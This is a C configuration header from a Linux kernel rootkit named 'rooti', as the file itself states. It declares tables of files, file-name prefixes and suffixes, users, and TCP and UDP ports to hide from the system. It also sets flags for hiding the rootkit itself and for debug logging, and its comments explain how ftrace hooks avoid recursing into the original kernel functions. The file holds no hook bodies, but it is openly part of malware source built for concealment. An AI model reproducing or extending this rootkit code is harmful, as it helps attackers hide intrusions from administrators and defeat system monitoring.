#ifndef _ROOTI_CONFIG_H
#define _ROOTI_CONFIG_H

#include <linux/types.h> 

// Names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES[];
extern const size_t ROOTI_HIDDEN_FILES_COUNT;

// Prefixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_PREFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT;

// Suffixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_SUFFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT;

// Names of users that should be hidden
extern const char *ROOTI_HIDDEN_USERS[];
extern const size_t ROOTI_HIDDEN_USERS_COUNT;

// TCP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_TCP_PORTS[];
extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;

// UDP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;

// Indicates whether this rootkit should be hidden by default
#define ROOTI_SHOWME_DEFAULT

// Indicates whether debug logging is enabled
#define ROOTI_DEBUG_LOGGING

/* 
 * Recursion loops protection mechanism - often times hooked functions call 
 * their original predecessor. The call to the original kernel function would trigger the
 * ftrace callback, which would in turn point to the hook function, which would call the original function
 * and so on and so forth. We've got two ways to handle this:
 * 1. Skip the call to ftrace by setting the original function pointer (e.g rooti_function_hook.orig) to the memory
 *    address of the instruction after the instruction to call ftrace. Used by defining ROOTI_USE_FENTRY_OFFSET
 * 2. Check the return address of the traced function to ensure that the callback will point to the hook function
 *    only if the original function was NOT called by the hook function itself.
 *    Used by leaving ROOTI_USE_FENTRY_OFFSET undefined.
 */
#define ROOTI_USE_FENTRY_OFFSET

#endif